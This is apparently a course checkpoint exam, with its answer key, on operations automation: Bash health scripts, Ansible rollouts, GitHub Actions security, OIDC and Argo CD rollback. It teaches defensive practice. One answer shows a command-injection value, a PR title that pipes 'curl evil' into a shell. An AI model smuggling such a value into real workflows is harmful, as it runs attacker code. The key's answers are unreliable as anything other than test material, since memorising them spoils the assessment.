# Phase 7 Checkpoint — Automation

> **Rules:** closed book, 90 minutes for Parts A–D. No CLI, no notes, no search. Then do the practical sign-off on a disposable VM and in a GitHub repo. Target: **80% overall (128/160)**, and at least **32/40** on the diagnosis scenarios.
>
> **Assumptions:** Bash 5.x on Linux, Python 3.11+, `ansible-core` 2.16+, GitHub Actions with hosted Ubuntu runners, Kubernetes 1.29+ for the rollout questions, and Argo CD 2.x for the GitOps questions. Where a command's exact output is environment-specific, answer with the evidence you would collect and the decision rule, not a memorized string.
>
> **Safety:** L7.3 must run against a disposable VM with a snapshot/console. L7.4 uses no cloud credentials; do not add static keys to pass the practical. The optional GitOps stretch must be cleaned up (`kind delete cluster`).

---

## Part A — Rapid facts (25 × 2 = 50 points)

1. What do `set -E`, `set -e`, `set -u`, and `set -o pipefail` each do?
2. Why is `set -e` not sufficient for a reliable operations script? Give two contexts where it does not exit.
3. Why is `flock` preferred over a PID file for preventing overlapping runs?
4. What is the purpose of `trap 'cleanup' EXIT`, and why should cleanup be idempotent?
5. What does `bash -n` prove? What does ShellCheck prove? What does neither prove?
6. In Bats, what does `run` capture, and why use `--separate-stderr` when testing JSON output?
7. Why should a health-check script write logs to stderr and machine output to stdout?
8. What is the difference between `curl -f` and `curl -w '%{http_code}'` for a health check?
9. Why write a report to a `mktemp` file and `mv` it into place instead of redirecting directly to the final path?
10. Why is `subprocess.run(..., shell=True)` dangerous, and what should replace it?
11. What timeout and retry rules should an HTTP client follow? Name two statuses to retry and two not to retry.
12. Why validate JSON fields at the boundary instead of using `.get(key, 0)` throughout the code?
13. What do exit codes 0, 1, 2, and 3 mean in the `capacity-report` lab?
14. Define inventory, playbook, role, task, and handler in Ansible.
15. Give the rough Ansible variable precedence from role defaults to extra vars. Where do facts fit?
16. When does an Ansible handler run, and what does `meta: flush_handlers` change?
17. What can `ansible-playbook --check --diff` miss or misreport?
18. What does `serial: 1` do, and why is it not the same as draining a host from a load balancer?
19. What does Ansible Vault protect? What does it not protect? What does `no_log` add?
20. What does `permissions: contents: read` do in a GitHub Actions workflow, and why set it explicitly?
21. Why is `run: echo "${{ github.event.pull_request.title }}"` dangerous? What is the safe pattern?
22. In GitHub OIDC, what do the `sub` and `aud` claims identify? What changes when a job uses an environment?
23. Why build an artifact once and promote it by digest/checksum instead of rebuilding per environment?
24. What does `kubectl rollout status` prove that `kubectl apply` does not? What can `kubectl rollout undo` not revert?
25. What is the difference between Argo CD's `Synced` and `Healthy` statuses? Why can `argocd app rollback` be undone by automated sync?

---

## Part B — Calculations (6 × 5 = 30 points)

### B1 — Exit-code aggregation and alert timing

A health check runs every 5 minutes. Its three checks return:

- disk at 82% (warning at 80%, critical at 95%);
- HTTP 503 from the application;
- TCP connection refused on the database port.

Assume a per-check false-CRIT probability of 1%, independent across checks and runs.

Answer:

1. What severity does the script record for each check, and what is the final exit code?
2. If the alert rule requires 3 consecutive CRIT runs, how long after the first CRIT does the page fire?
3. How many runs occur in 24 hours, and what is the probability of at least one false CRIT in that period?
4. Why is a 1% per-check false-positive rate unacceptable for paging, even with a 3-consecutive rule?
5. Name two changes that reduce false pages without hiding a real outage.

### B2 — Disk threshold and reserved space

A data filesystem is 500 GB. It currently holds 430 GB. The warning threshold is 80%, critical is 90%, and the team reserves 10% of raw capacity for snapshots and rebuild headroom.

Answer:

1. What is the current raw utilization percentage, and which threshold state is it in?
2. How many GB can be written before the raw critical threshold? Before the disk is 100% full?
3. At a growth rate of 2 GB/day, how many days until critical and until full?
4. Recompute utilization against **usable** capacity after the 10% reservation. What state is the filesystem in now?
5. Why should the alert thresholds be based on usable capacity, and what should be graphed alongside the percentage?

### B3 — Capacity report with projects and totals

Flavors:

| Flavor | vCPU | RAM MB | Disk GB |
|---|---:|---:|---:|
| small | 2 | 4096 | 20 |
| large | 8 | 32768 | 100 |

Servers (one `small` is `DELETED` and must be ignored):

- Project `alpha`: 3 × small, 1 × large.
- Project `beta`: 2 × large.
- Project `alpha`: 1 × small with status `DELETED`.

Limits:

| Project | vCPU | RAM MB | Disk GB |
|---|---:|---:|---:|
| alpha | 16 | 65536 | 200 |
| beta | 16 | 65536 | 200 |
| TOTAL (sum) | 32 | 131072 | 400 |

The threshold is 85%, and a finding is emitted when `used / limit > threshold`.

Answer:

1. Compute usage for `alpha`, `beta`, and `TOTAL` (servers, vCPU, RAM, disk).
2. Compute the utilization percentages for each resource.
3. List every finding at the 85% threshold.
4. List every finding at a 90% threshold. What changes at exactly 90%?
5. If the deleted server were accidentally counted, what would `alpha`'s usage and findings be at 85%?

### B4 — Ansible rollout timing and blast radius

You have 24 web hosts. Each batch takes 3 minutes to apply and 1 minute to verify. Use `serial: 6`. A failure occurs during the apply phase of the third batch, 2 minutes into that batch.

Answer:

1. How many batches are there, and how long does a fully successful rollout take?
2. How much time has elapsed when the failure occurs?
3. How many hosts are fully converged, partially changed, and untouched at that moment?
4. With `max_fail_percentage: 10` and a batch size of 6, does one failed host abort the play? What if the batch size were 10?
5. Compare with `serial: 1`: total success time, time to the same failure at host 10, and hosts converged.

### B5 — CI artifact storage

Each build produces a 12 MB wheel and a 10 MB source distribution. You build 30 times per day and retain artifacts for 14 days. Assume steady state (the oldest artifacts expire as new ones arrive) and a storage price of $0.25/GB-month, with 500 MB free.

Answer:

1. How much artifact data does one build produce?
2. How much is produced per day?
3. What is the steady-state storage at 14-day retention?
4. What is the steady-state storage at 7-day retention, and the approximate monthly cost in each case?
5. Why is uploading one artifact per build better than uploading the same files from several jobs?

### B6 — Pipeline critical path

A pipeline has:

- `lint`: 3 minutes;
- `test`: 5 minutes per matrix leg, two legs in parallel;
- `build`: 2 minutes, needs lint and test;
- `smoke`: 2 minutes, needs build;
- `deploy`: 4 minutes, needs smoke and an environment approval.

Answer:

1. What is the critical path in minutes with all jobs succeeding?
2. What is the critical path if the two test legs run serially?
3. What is the critical path if caching reduces each test leg to 3 minutes?
4. If the environment approval waits 30 minutes, what is the compute time and what is the lead time?
5. If `lint` fails at 1 minute and `test` does not depend on `lint`, when does the run finish, and which jobs are skipped?

---

## Part C — Diagnosis scenarios (8 × 5 = 40 points)

For each scenario, name the **fault domain**, the **next two evidence sources/commands**, and the **fix**. Do not propose a fix before naming evidence.

### C1 — The script logs CRIT but exits 0

```bash
#!/usr/bin/env bash
set -euo pipefail

check_http() {
  if ! curl -fsS --max-time 3 "$1" >/dev/null; then
    echo "CRIT http $1"
  fi
}

check_http "http://127.0.0.1:8080/health"
echo "done"
```

```text
$ ./check.sh; echo "exit=$?"
CRIT http http://127.0.0.1:8080/health
done
exit=0
```

The monitoring system alerts only on a non-zero exit.

### C2 — DNS failure looks like an application outage

```text
$ ./svc-health.sh -e https://api.example.com/health
... CRIT http:https://api.example.com/health: HTTP 000 (expected 2xx)
... SUMMARY severity=2 checks=1
```

The application owner says the service is healthy. The on-call page says "API down."

### C3 — Python traceback on malformed input

```text
$ capacity-report --servers servers.json --flavors flavors.json --limits limits.json
Traceback (most recent call last):
  ...
json.decoder.JSONDecodeError: Expecting ',' delimiter: line 12 column 5 (char 245)
```

The pipeline marks the job failed, but the on-call engineer cannot tell whether the data or the tool is wrong.

### C4 — Ansible reports `changed=1` on every run

```yaml
- name: Initialize the application
  ansible.builtin.command: /usr/local/bin/app-init --once
```

```text
PLAY RECAP
web1 : ok=12 changed=1 unreachable=0 failed=0
```

The command is safe to run repeatedly but always reports `changed`.

### C5 — The config changed, but nginx serves the old content

```text
TASK [baseline : Deploy nginx configuration] ***
changed: [web1]

TASK [baseline : Ensure nginx is running] *****
ok: [web1]

PLAY RECAP
web1 : ok=14 changed=1 ...
```

```text
$ curl -sS http://web1:8080/health
ok
```

The template now says `ok-v2`. The service was started, not reloaded, and the handler did not run.

### C6 — OIDC fails after adding an environment

```text
An error occurred (AccessDenied) when calling the AssumeRoleWithWebIdentity operation:
Not authorized to perform sts:AssumeRoleWithWebIdentity
```

The IAM role trust policy contains:

```json
"StringLike": {
  "token.actions.githubusercontent.com:sub": "repo:my-org/app:ref:refs/heads/main"
}
```

The workflow job now has `environment: production` and runs on `main`.

### C7 — The deploy is green but runs yesterday's code

A deploy workflow takes a user-supplied `run_id`, downloads the `capacity-report` artifact from that run, verifies its checksum, installs it, and prints `status: verified`. The operator passes yesterday's successful run ID because today's build is red. The deployment record says `source_sha` = yesterday's commit. The service reports the old version.

### C8 — The GitOps rollback does not stick

```text
$ argocd app history capacity-report-prod
ID  DATE                 REVISION
12  2026-10-26 14:02:11  a1b2c3d  (bad image)
11  2026-10-26 13:40:02  e4f5g6h  (known good)

$ argocd app rollback capacity-report-prod 11
$ argocd app get capacity-report-prod
Sync Status: Synced to main (a1b2c3d)
Health Status: Degraded
```

Automated sync with self-heal is enabled.

---

## Part D — Design and explain (2 × 20 = 40 points)

### D1 — Safe automation for 50 web VMs

Design an automation system for 50 Ubuntu VMs running a stateless web service behind a load balancer. The team has four engineers and deploys several times per week.

Cover:

1. What belongs in Bash, what belongs in Python, and what belongs in Ansible. Give one concrete task for each.
2. Repository layout and review rules for playbooks, roles, inventory, and secrets.
3. CI stages from pull request to a staging deploy, including what is tested and what is merely linted.
4. Rollout strategy: batch size, health checks, drain/re-add, failure thresholds, and when to stop.
5. Secret management for the app and for Ansible, including what must never be committed.
6. Rollback plan for a bad app release and for a bad host configuration. What is different?
7. Observability and evidence: what you log, graph, and alert on during and after a rollout.

### D2 — GitOps promotion for three clusters

Design a GitOps model for `dev`, `staging`, and `prod` clusters serving two product teams. CI builds images; platform engineering owns the clusters.

Cover:

1. Repository structure: one app repo, one manifest repo, or a monorepo. Justify the choice and the ownership boundaries.
2. How an image digest moves from CI to dev, staging, and prod. Where are the approvals and who can approve?
3. Argo CD projects, RBAC, and cluster registration. How do you prevent team A from syncing into team B's namespace or prod?
4. Secret management in Git. Compare at least two mechanisms and state what is never stored in Git.
5. Drift detection and emergency changes. What happens when an engineer runs `kubectl edit` during an incident?
6. Rollback and promotion failure: a bad digest reaches prod. Give the exact Git/Argo CD sequence and the data-migration caveat.
7. What the platform team monitors about the GitOps system itself, and what happens if Argo CD is down during a deploy.

---

## Answer key

### Part A

1. `-E` makes the `ERR` trap inherited by functions/subshells; `-e` exits on an unhandled failing simple command; `-u` treats unset variables/parameters as errors; `pipefail` makes a pipeline return the rightmost non-zero status (otherwise the last command's status wins).
2. `set -e` is disabled in conditions (`if`, `while`, `until`), `&&`/`||` lists, `!` negations, and some command-substitution contexts. A function called in a condition may run with `-e` suppressed. Use explicit checks and exit codes.
3. `flock` locks an open file description; the kernel releases it when the process exits, including a crash. A PID file can be stale, reused by another process, or raced between check and write.
4. `trap ... EXIT` runs cleanup on normal exit and on `exit` from an error path. It should be idempotent because it may run after partial cleanup or be invoked more than once by signal/exit paths. Use `rm -f`, check existence, and avoid failing the trap.
5. `bash -n` parses without executing; ShellCheck performs static semantic/portability/quoting analysis; neither proves runtime behavior, external command behavior, or that the logic is correct.
6. `run` executes the command and captures `status`, `output`, and (with `--separate-stderr`) `stderr`. Separating stderr keeps log lines out of JSON/text that you want to parse or compare.
7. Stdout is the machine-readable product; stderr is diagnostics. Piping stdout to `jq` or a monitoring agent should not require stripping timestamps or warnings.
8. `curl -f` returns non-zero for HTTP 4xx/5xx and suppresses the body; `-w '%{http_code}'` prints the status (including `000` on connection failure), letting the script classify the failure. Use `-f` for downloads, `-w` for health classification.
9. `mktemp` creates a unique file; writing then `mv` within the same filesystem is an atomic rename. A reader sees either the old complete file or the new complete file, never a truncated one. A direct redirect truncates before writing.
10. `shell=True` runs a shell and interprets metacharacters, so untrusted input can inject commands. Pass an argument list with `shell=False`, validate inputs, and use a timeout; avoid shell pipelines or build them explicitly.
11. Use a connect timeout and a read/overall timeout; retry idempotent operations with exponential backoff, jitter, a maximum attempt count, and an overall deadline. Retry 429/408/502/503/504 and connection/timeouts; do not retry 400/401/403/404. Respect `Retry-After`.
12. Boundary validation fails with the record context, prevents silent undercounting, and keeps the rest of the code free of defensive `.get(..., 0)`. A missing field is a data error, not a zero.
13. `0` success/no finding; `1` data/runtime error; `2` usage error (argparse); `3` report generated with at least one capacity finding. The distinct code lets CI route a finding differently from a broken tool.
14. Inventory: hosts/groups and connection variables. Playbook: one or more plays mapping hosts to roles/tasks. Role: reusable bundle of tasks/defaults/vars/handlers/templates. Task: one module call. Handler: a task triggered by `notify`, usually reload/restart.
15. Roughly: role defaults < inventory `group_vars` < inventory `host_vars` < play vars < role vars < task vars < extra vars (`-e`). Facts are discovered runtime variables and are not a precedence layer in the same sense; they can be overridden by higher-precedence vars but should be treated as read-only inputs.
16. A handler runs once at the end of a play if at least one notifying task reported `changed` and the handler name matches. `meta: flush_handlers` forces pending handlers to run immediately, so later tasks (like a health check) see the new service state.
17. Check mode is only as good as each module's support. A fresh host may lack packages/binaries the check needs; `command`/`shell` may run; `--diff` can be suppressed by `no_log`; templates may render differently; and a check cannot prove the service works after a reload.
18. `serial: 1` runs the play against one host at a time. It limits the batch size but does not remove the host from a load balancer, wait for in-flight requests, or verify traffic health. Draining is a separate load-balancer/health-check procedure.
19. Vault encrypts files at rest and decrypts in memory at run time. It does not protect the rendered file on the target, logs, backups, or a task's output. `no_log` suppresses a task's output/diff but does not encrypt the file or fix a leaking template.
20. It grants the `GITHUB_TOKEN` read-only repository contents, which is enough for checkout, and denies other scopes unless a job overrides them. Explicit permissions protect against a repository setting change or a compromised dependency.
21. `${{ }}` is substituted into the script before the shell parses it, so a PR title containing `"; curl evil | sh; #` becomes shell code. Pass untrusted values through `env:` and reference the quoted variable (`"$PR_TITLE"`); never interpolate them directly into `run:`.
22. `sub` identifies the repository and context (branch, PR, or environment); `aud` identifies the intended audience/cloud (for AWS, `sts.amazonaws.com`). With an environment, the `sub` becomes `repo:org/repo:environment:<name>`; the `environment` claim is also present.
23. Rebuilding can resolve different dependencies, base images, or compiler behavior, so staging/prod may not run the bytes that were tested. Build once, record a checksum/digest, and promote that exact artifact.
24. `rollout status` waits for the deployment's rollout to converge (new ReplicaSets available, old scaled down) and returns non-zero on timeout. `apply` only submits the desired object. `undo` reverts the pod template, not ConfigMaps, Secrets, PVCs, CRDs, database schema, or external side effects.
25. `Synced` means the desired manifests were applied; `Healthy` means the live resources are healthy. They are independent. `argocd app rollback` syncs an older revision, but automated sync sees the bad `HEAD` and reconciles back; revert Git or disable automated sync first.

### Part B

**B1**

1. Disk WARN (1), HTTP CRIT (2), TCP CRIT (2). Severity is the maximum, so exit 2.
2. First CRIT at `t=0`, second at `t=5`, third at `t=10`; the page fires at 10 minutes.
3. 24 × 60 / 5 = 288 runs. `P(at least one) = 1 - 0.99^288 ≈ 1 - 0.0553 = 0.9447`, about 94.5%.
4. A 1% per-check false rate across hundreds of runs produces frequent pages; a 3-consecutive rule reduces isolated flakes but correlated false failures (same DNS/network) still page, and real outages are delayed by two intervals.
5. Distinguish WARN from CRIT, require consecutive CRIT (or a short `for:` duration), add a DNS/route check and classify `000` by curl exit code, deduplicate alerts, and route UNKNOWN to the tool owner rather than the service owner.

**B2**

1. `430 / 500 = 86%`; WARN (above 80%, below 90%).
2. Raw critical at `0.90 × 500 = 450 GB`, so 20 GB remain; full at 500 GB, so 70 GB remain.
3. At 2 GB/day: 10 days to critical, 35 days to full.
4. Reserved 10% = 50 GB; usable = 450 GB. `430 / 450 = 95.6%`, which is above the 90% critical threshold. Only 20 GB of usable headroom remains.
5. Raw percentages hide the reservation; alert on usable capacity so snapshots/rebuilds do not fail before the graph says 100%. Graph bytes used, bytes free, inode usage, growth rate, and snapshot/rebuild reserve.

**B3**

1. `alpha`: 4 servers (3 small + 1 large), vCPU `3×2 + 8 = 14`, RAM `3×4096 + 32768 = 45056 MB`, disk `3×20 + 100 = 160 GB`. `beta`: 2 servers, vCPU 16, RAM 65536 MB, disk 200 GB. `TOTAL`: 6 servers, vCPU 30, RAM 110592 MB, disk 360 GB.
2. `alpha`: 14/16 = 87.5%, 45056/65536 = 68.75%, 160/200 = 80%. `beta`: 100%, 100%, 100%. `TOTAL`: 30/32 = 93.75%, 110592/131072 = 84.375%, 360/400 = 90%.
3. At 85% (`>`): `alpha` vCPU (87.5); `beta` vCPU, RAM, disk; `TOTAL` vCPU (93.75), disk (90). Total 6 findings. `TOTAL` RAM is 84.375, below 85, so no finding.
4. At 90% (`>`): `alpha` none (87.5 < 90); `beta` all three; `TOTAL` vCPU (93.75) only. Disk is exactly 90%, and the comparison is strict `>`, so it is not a finding. Total 4 findings.
5. Counting the deleted small server adds 1 server, 2 vCPU, 4096 MB, 20 GB to `alpha`: `16/16 = 100%`, `49152/65536 = 75%`, `180/200 = 90%`. At 85%, `alpha` has vCPU and disk findings; `beta` has 3; `TOTAL` is `32/32 = 100%`, `114688/131072 = 87.5%`, `380/400 = 95%`, so `TOTAL` has all three. Total 8 findings. This is why status filtering must be tested.

**B4**

1. `24 / 6 = 4` batches. Each batch `3 + 1 = 4` minutes; full success `4 × 4 = 16` minutes.
2. Two full batches = 8 minutes, plus 2 minutes into batch 3 = 10 minutes.
3. Fully converged: 12 hosts (batches 1–2). Partially changed: the 6 hosts in batch 3 (some tasks applied, no verification). Untouched: the 6 hosts in batch 4.
4. Batch 6: `1/6 = 16.7% > 10%`, so one failure aborts. Batch 10: `1/10 = 10%`, which does **not exceed** 10%, so the play may continue (depending on `any_errors_fatal`). This strict comparison is easy to misread; test it.
5. `serial: 1`: 24 batches × 4 min = 96 minutes. Failure at host 10 after 2 minutes of apply: hosts 1–9 took `9 × 4 = 36` minutes, plus 2 = 38 minutes. Nine hosts fully converged, host 10 partially changed, 14 untouched. Smaller blast radius, much longer rollout.

**B5**

1. `12 + 10 = 22 MB` per build.
2. `30 × 22 = 660 MB/day` (about 0.645 GB/day using 1 GB = 1024 MB, or 0.66 GB using decimal; state your convention).
3. Steady state at 14 days ≈ `14 × 660 MB = 9240 MB ≈ 9.24 GB` (decimal) or `9.02 GiB` (binary).
4. At 7 days: `7 × 660 = 4620 MB ≈ 4.62 GB`. At $0.25/GB-month and 500 MB free: 14-day overage ≈ `9.24 - 0.5 = 8.74 GB` → about `$2.19/month`; 7-day overage ≈ `4.62 - 0.5 = 4.12 GB` → about `$1.03/month`. Prices and free tiers vary; the arithmetic is the point.
5. Multiple uploads duplicate bytes, can produce different artifact contents/names, and make it unclear which artifact was tested. Upload once in `build`, then download the same artifact in `smoke`/deploy and verify its checksum.

**B6**

1. Lint and test run in parallel: `max(3, 5) = 5`; build `+2 = 7`; smoke `+2 = 9`; deploy `+4 = 13` minutes.
2. Test legs serial: `5 + 5 = 10`; lint parallel `max(3, 10) = 10`; build 12; smoke 14; deploy 18 minutes.
3. Cached test legs: `max(3, 3) = 3`; build 5; smoke 7; deploy 11 minutes.
4. Compute time remains 13 minutes; lead time is `13 + 30 = 43` minutes (plus queue time). The approval wait is not runner compute.
5. If test does not depend on lint, it still runs for 5 minutes; build/smoke/deploy are skipped, so the run finishes around 5 minutes (plus overhead). If test depends on lint, it is skipped and the run finishes around 1 minute. Make the dependency deliberate.

### Part C

**C1 — Exit-status contract**

- **Fault domain:** the script's control flow/exit status, not the HTTP check.
- **Evidence:** `bash -x ./check.sh`; `echo $?` after each command; `type check_http`; run with a deliberately failing URL and inspect the last command's status. The function's `if` consumes `curl`'s failure, and the final `echo "done"` returns 0.
- **Fix:** track severity (`severity=2`) and `exit "$severity"` at the end, or `return 2`/`exit 2` from the check. Add a Bats test that asserts the exit code, not just the log text.
- **Why:** a log line is not an API. Monitoring that keys on exit status will miss the failure.

**C2 — DNS vs application**

- **Fault domain:** name resolution or network path to the endpoint, not the application process.
- **Evidence:** `curl -v` (shows "Could not resolve host" vs "Connection refused"), `getent hosts api.example.com`, `dig +short api.example.com`, `curl --resolve api.example.com:443:<known-ip>`, and the curl exit code (6 = could not resolve, 7 = connect failed, 28 = timeout). Compare from another network.
- **Fix:** repair DNS (resolver config, search domain, split-horizon, expired record) or the network path; do not restart the application. Add a separate DNS check and include the curl exit code in the report detail.
- **Why:** mapping every `000` to "service down" sends the page to the wrong owner and hides a resolver outage.

**C3 — Unhandled data error**

- **Fault domain:** input parsing/error handling in the tool, not the capacity math.
- **Evidence:** the traceback's exception type and line; `jq . flavors.json` to confirm the malformed file; `python -m json.tool`; the CI artifact/log to see which input was used; `--verbose` logs.
- **Fix:** catch `json.JSONDecodeError`/`ValueError`/`OSError` at the CLI boundary, log a one-line message with the file path and position, return exit 1, and keep the traceback behind `--debug`. Add a malformed-JSON test.
- **Why:** a traceback is for the developer; the operator needs to know whether to fix the data or the tool.

**C4 — Non-idempotent command**

- **Fault domain:** the Ansible task's change reporting/state check, not the command's safety.
- **Evidence:** run with `-vvv`; inspect the task's `changed`/`rc`/`stdout`; check whether `/usr/local/bin/app-init --once` has a marker file or a query mode; `ansible-playbook --check --diff`.
- **Fix:** use a module that models the state, or add `creates: /var/lib/app/initialized` if the command creates a marker, or `changed_when: <real condition>` based on the command's output. Do not blanket `changed_when: false` if the command actually changes state.
- **Why:** `changed=1` on every run destroys the signal that idempotence depends on.

**C5 — Handler not run**

- **Fault domain:** Ansible notification/handler flow, not nginx.
- **Evidence:** the task output (`changed` vs `ok`), exact `notify` name vs handler name, handler section, `--check --diff`, `systemctl show nginx -p ExecMainStartTimestamp`, `curl` body, `nginx -T` to see the loaded config.
- **Fix:** match the handler name exactly, ensure the notifying task reports `changed`, add `meta: flush_handlers` before the health check, and verify the reload command succeeds. If the task reports `ok`, the template content did not change; investigate the template/variables.
- **Why:** "service is running" only proves the process exists. The loaded config may be the old one.

**C6 — OIDC subject mismatch**

- **Fault domain:** IAM trust policy vs GitHub OIDC claims, not the application.
- **Evidence:** decode the token payload and print `sub`/`aud`/`environment`; `aws sts get-caller-identity`; `aws iam get-role --role-name ... --query 'Role.AssumeRolePolicyDocument'`; CloudTrail `AssumeRoleWithWebIdentity` event; confirm the job's `environment:` and `permissions: id-token: write`.
- **Fix:** update the trust policy `sub` to `repo:my-org/app:environment:production` (scoped to that environment) and keep `aud` `sts.amazonaws.com`. Do not switch to static keys.
- **Why:** adding `environment:` changes the `sub`; the old `ref:refs/heads/main` policy no longer matches, even though the job runs on `main`.

**C7 — Artifact provenance**

- **Fault domain:** release provenance/promotion, not the deploy mechanism.
- **Evidence:** deployment record `source_sha` vs the expected `main` HEAD; `gh run view <run_id> --json headSha,conclusion,headBranch`; artifact checksum; the running version endpoint/log; the deploy workflow's source-run validation (or lack of it).
- **Fix:** require the source run to be successful, on `main`, and at the expected SHA; compare the artifact's source SHA to the commit being promoted; record the digest; fail if they differ. Do not accept "the pipeline is green" as provenance.
- **Why:** a green deploy of the wrong artifact is still a wrong deploy. The user-supplied `run_id` is an input that must be validated.

**C8 — GitOps rollback vs auto-sync**

- **Fault domain:** GitOps reconciliation, not the application.
- **Evidence:** `argocd app get` (sync/health, target revision), `argocd app history`, the auto-sync policy, the Git `HEAD` commit, controller logs, and the live image digest.
- **Fix:** revert the bad commit in Git and let auto-sync reconcile; or disable automated sync (`argocd app set <app> --sync-policy none`), roll back/sync the desired revision, investigate, then re-enable. Record the decision.
- **Why:** `argocd app rollback` is a sync to an older revision; auto-sync sees the bad `HEAD` and reconciles back. Git remains the source of truth.

### Part D

**D1 — Example answer**

1. **Tools:** Bash for a short, read-only health/collector script (disk, service, endpoint) with exit codes; Python for a typed API/report tool (inventory pagination, capacity join, JSON output); Ansible for convergent host configuration (packages, users, templates, services, handlers). Do not use Bash for complex JSON or Ansible for one-off data analysis.
2. **Layout:** `ansible/` with `ansible.cfg`, `inventory/`, `group_vars/`, `roles/`, `site.yml`, `requirements.yml`; `scripts/` for Bash; `tools/` for Python; `.github/workflows/` for CI. Protect `main`, require review for `ansible/` and workflows, use `CODEOWNERS`. Keep encrypted Vault files in Git only if the password is in a secret manager; never commit the password, plaintext secrets, or `.env`.
3. **CI:** lint (ShellCheck, Ruff, mypy, ansible-lint, yamllint), unit tests (Bats, pytest), `ansible-playbook --syntax-check`, build the Python artifact, checksum, smoke-install, then a staging deploy gated by an environment. Lint proves form; tests prove logic; only a real staging convergence proves the host path. Run the integration/staging job on a schedule or merge, not every PR, if it is slow.
4. **Rollout:** `serial` batches (for example 10% or 5 hosts), `max_fail_percentage`/`any_errors_fatal`, drain from the load balancer, wait for in-flight requests, apply, run a health check, re-add, observe error rate/latency for a bake period, then continue. Stop on the first failed health check; do not "continue and fix later."
5. **Secrets:** app secret in a secret manager/Vault, injected at deploy/runtime; Ansible Vault for values that must live with the repo, with the vault password in a secret manager; `no_log` on secret tasks; file mode `0600`; never commit plaintext, vault passwords, cloud keys, or CI tokens. Prefer OIDC/short-lived credentials for cloud access.
6. **Rollback:** app release: redeploy the previous artifact digest, verify health; host config: rerun the previous playbook/role version, restore the backed-up config, or rebuild the host from the golden image. Config rollback is not automatically the inverse of the forward change; test it. Database migrations need expand/contract and a forward-fix plan.
7. **Observability:** structured deploy logs with host/batch/version, Ansible recap, health-check results, load-balancer drain/re-add events, error rate/latency/saturation, and a deployment marker on dashboards. Alert on failed batches, health-check failures, and post-deploy error-rate regression. Keep the artifact digest and playbook commit in the record.

**D2 — Example answer**

1. **Structure:** separate app repos and a manifest repo (or a monorepo with strict `CODEOWNERS`). App CI owns build/test/image; manifest repo owns desired state and promotion. Platform engineering reviews prod overlays; product teams review their dev/staging overlays. Separate repos reduce the blast radius of an app-repo token and make promotion a reviewable PR.
2. **Promotion:** CI builds and pushes an image by digest, then opens a PR to `overlays/dev` with the digest. Merge → Argo CD syncs dev. After dev verification, a PR to `overlays/staging`; staging approval; then a PR to `overlays/prod` requiring platform review and a prod environment/approval. Never promote a tag; promote the digest. Record the source commit and CI run.
3. **Argo CD projects/RBAC:** one `AppProject` per team/environment with `sourceRepos` limited to the team's manifest paths, `destinations` limited to the team's cluster/namespace, and `clusterResourceWhitelist` empty or minimal. Use SSO groups mapped to Argo CD roles (`readonly`, `developer`, `admin`); prod sync restricted to platform/release managers. Register clusters with scoped service accounts, not cluster-admin.
4. **Secrets:** External Secrets Operator syncing from AWS Secrets Manager/Vault, or Sealed Secrets/SOPS with keys managed outside Git. Never store plaintext Secrets, cloud keys, vault passwords, or decryption keys in Git. The controller/cluster needs workload identity to fetch secrets; Git contains only references/encrypted values.
5. **Drift/emergency:** `selfHeal` reverts manual edits; during an incident, either make the change in Git immediately (preferred) or disable automated sync for the app, make the emergency change, then commit it back and re-enable. Record the exception. `argocd app diff` shows drift; alert on `OutOfSync` beyond a grace period.
6. **Rollback:** `git revert <bad-commit>` (or reset the overlay to the previous digest), push, let auto-sync reconcile; verify `Synced` + `Healthy` + smoke test. If auto-sync is the problem, disable it first, sync the known-good revision, then fix Git. Database migrations: revert only if backward-compatible; otherwise roll forward with a fix. `argocd app rollback` is an emergency tool, not the primary path.
7. **Monitor the GitOps system:** Argo CD controller/application-controller health, repo-server latency/errors, sync failures, app `OutOfSync`/`Degraded` counts, reconciliation lag, webhook/poll failures, cluster API latency, and certificate/token expiry. If Argo CD is down, clusters keep running the last applied state; deploys pause. Have a break-glass `kubectl` path with audit and a plan to reconcile Git afterward.

---

## Scoring

| Section | Points | Your score | Target |
|---|---:|---:|---:|
| A — facts | 50 | | ≥ 40 |
| B — calculations | 30 | | ≥ 24 |
| C — diagnosis | 40 | | ≥ 32 |
| D — design | 40 | | ≥ 32 |
| **Total** | **160** | | **≥ 128 (80%)** |

If you score below 80%, re-read the specific note, redo the lab, and retake after 48 hours. A miss in exit-code design, idempotence, or artifact provenance will compound in Phase 8, where the monitoring and incident response depend on trustworthy automation.

---

## Practical sign-off

Do these without notes. Each is pass/fail. Mark anything you could not execute (for example, no GitHub account or no disposable VM) as **not executed**, not as passed.

- [ ] Write or extend a Bash script with strict mode, argument validation, a lock, a dry-run, an atomic report, and monitoring-friendly exit codes.
- [ ] Run `bash -n` and ShellCheck; fix every finding or justify a suppression.
- [ ] Run a Bats suite that asserts exit codes, JSON output, lock contention, and the dry-run behavior.
- [ ] Build the Python capacity report and pass `pytest`, `ruff`, and `mypy`.
- [ ] Prove malformed JSON, unknown flavor, missing limit, and duplicate flavor each exit 1 with context.
- [ ] Prove the threshold boundary (`>` vs `>=`) with a test.
- [ ] Run an Ansible playbook twice and show `changed=0` on the second run.
- [ ] Run `--check --diff` on the converged host and show no changes.
- [ ] Break the nginx template and prove validation fails without replacing the live config.
- [ ] Remove a `notify` and prove the file changed while the running process did not.
- [ ] Prove the secret file is `0600` without printing its contents; show `no_log` behavior.
- [ ] Trigger a CI run; show lint, test matrix, build, and smoke jobs.
- [ ] Download the artifact, verify its checksum, install it in a clean venv, and run it.
- [ ] Trigger the deploy workflow; show the environment gate and the OIDC `sub`/`aud` claims.
- [ ] Prove a wrong run ID or tampered artifact fails before installation.
- [ ] Revert a bad deploy or a bad GitOps commit and prove the previous version is healthy.
- [ ] Clean up: VM snapshot restored or teardown run; kind cluster deleted; local venvs/artifacts removed; no secrets in the repo.

**Evidence to keep:** `bats` output, `pytest` output, `ansible-playbook` recaps, `gh run view` summaries, the OIDC claims (redact anything sensitive), the deployment record, and the cleanup proof. A screenshot is weaker than command output.

---

## Oral exam (12 minutes)

Answer out loud, without notes. Record yourself. If you use a term you cannot define, stop and define it.

1. "Walk me through a Bash health check from argument parsing to exit code. Where can it lie?"
2. "Why is `set -e` not enough, and what do you use instead?"
3. "A Python tool gets malformed JSON in CI. What should the operator see, and what should the developer see?"
4. "How do you prove an Ansible role is idempotent, and what does `changed=0` not prove?"
5. "A template changed but the service still serves the old config. What are your first three checks?"
6. "What is the difference between `serial: 1`, `max_fail_percentage`, and draining a host?"
7. "Design a CI pipeline for this tool. What is built once, what is gated, and what is verified?"
8. "How does OIDC remove static cloud keys, and why did adding an environment break the trust policy?"
